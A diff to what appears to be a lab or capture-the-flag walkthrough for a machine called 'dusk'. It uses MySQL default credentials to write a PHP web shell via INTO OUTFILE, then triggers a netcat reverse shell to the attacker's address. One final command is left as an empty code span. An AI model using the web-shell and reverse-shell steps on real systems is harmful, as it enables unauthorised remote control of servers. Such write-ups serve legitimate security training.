@@ -50,4 +50,19 @@ Service Info: Host:  dusk.dusk; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 80 is just the default debian page again, but 8080 seems to be a php server running off /var/tmp, listing its files and running the index.php file there. Looks pretty juicy. nikto on either failed: nothing interesting on the default page, and 8080 is basically just a ftp listing.
 
-Speaking of, ftp did not allow anonymous access. Neither did the mysql endpoint. Playing around with SMTP didn't achieve much. Ultimately a scan with legion, and a check for default credentials, revealed mysql used `root:password`. The following command got me in: `mysql -u root -p -h 192.168.53.6` followed by entering the password.
+Speaking of, ftp did not allow anonymous access. Neither did the mysql endpoint. Playing around with SMTP didn't achieve much. Ultimately a scan with legion, and a check for default credentials, revealed mysql used `root:password`. 
+
+## MySQL to create php shell, then reverse netcat.
+
+The following command got me in to mysql: `mysql -u root -p -h 192.168.53.6` followed by entering the password `password`.
+
+I browsed around for a bit, but found nothing. However, given the :8080 site was a PHP cli site which helpfully listed its exact location on the page, I tried the 'into outfile' trick and it worked:
+
+```
+MariaDB [(none)]> select '<?php system($_GET["cmd"]); ?>' into outfile '/var/tmp/cmd.php';
+Query OK, 1 row affected (0.001 sec)
+```
+
+Then going to the php site, sure enough cmd.php was there. Browsing to it with `192.168.53.6:8080/cmd.php?cmd=ls` ran ls successfully. Time for a reverse netcat shell!
+
+`192.168.53.6:8080/cmd.php?cmd=nc%20192.168.53.4%204444%20-e%20/bin/bash` plus `nc -nvlp 4444` in another prompt got me a reverse nc, then `` got me a nice shell.
